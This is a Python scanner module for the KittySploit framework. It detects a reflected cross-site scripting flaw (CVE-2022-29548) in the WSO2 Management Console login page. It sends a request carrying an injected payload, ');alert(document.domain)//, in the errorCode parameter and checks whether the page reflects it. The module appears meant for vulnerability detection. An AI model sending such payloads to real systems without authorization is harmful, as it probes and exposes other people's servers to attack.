#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WSO2 contains a reflected cross-site scripting vulnerability in the Management Console of API Manager 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WSO2 - Cross-Site Scripting Detection',
        'description': 'WSO2 contains a reflected cross-site scripting vulnerability in the Management Console of API Manager 2.2.0, 2.5.0, 2.6.0, 3.0.0, 3.1.0, 3.2.0, and 4.0.0; API Manager Analytics 2.2.0, 2.5.0, and 2.6.0; API Microgateway 2.2.0; Data Analytics Server 3.2.0; Enterprise Integrator 6.2.0, 6.3.0, 6.4.0, 6.5.0, and 6.6.0; IS as Key Manager 5.5.0, 5.6.0, 5.7.0, 5.9.0, and 5.10.0; Identity Server 5.5.0, 5.6.0, 5.7.0, 5.9.0, 5.10.0, and 5.11.0; Identity Server Analytics 5.5.0 and 5.6.0; and WSO2 Micro Integrator 1.0.0.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wso2', 'xss', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1603',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-29548',
            'http://packetstormsecurity.com/files/167587/WSO2-Management-Console-Cross-Site-Scripting.html',
            'https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2022/WSO2-2021-1603/',
            'https://github.com/vishnusomank/GoXploitDB',
        ],
        'cve': 'CVE-2022-29548',
    }

    def run(self):
        r = self.http_request(method="GET", path='/carbon/admin/login.jsp?loginStatus=false&errorCode=%27);alert(document.domain)//', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ("CARBON.showWarningDialog('???');alert(document.domain)//???",)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WSO2 - Cross-Site Scripting detected",
                path='/carbon/admin/login.jsp?loginStatus=false&errorCode=%27);alert(document.domain)//',
            )
            return True
        return False

